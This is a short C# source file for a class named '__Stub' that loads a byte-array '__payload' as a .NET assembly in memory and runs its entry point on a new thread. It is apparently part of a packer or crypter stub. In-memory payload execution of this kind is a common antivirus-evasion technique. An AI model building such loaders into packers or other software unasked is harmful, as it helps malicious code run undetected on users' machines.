using System.Reflection;
using System.Threading;

public partial class __Stub
{
	/// <summary>
	/// void Invoke(byte[] payload)
	/// </summary>
	public static void __Invoke(byte[] __payload)
	{
		Thread thread = new Thread(() =>
		{
			Assembly.Load(__payload).EntryPoint.Invoke(null, new[] { __CommandLineArguments });
		});

		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start();
	}
}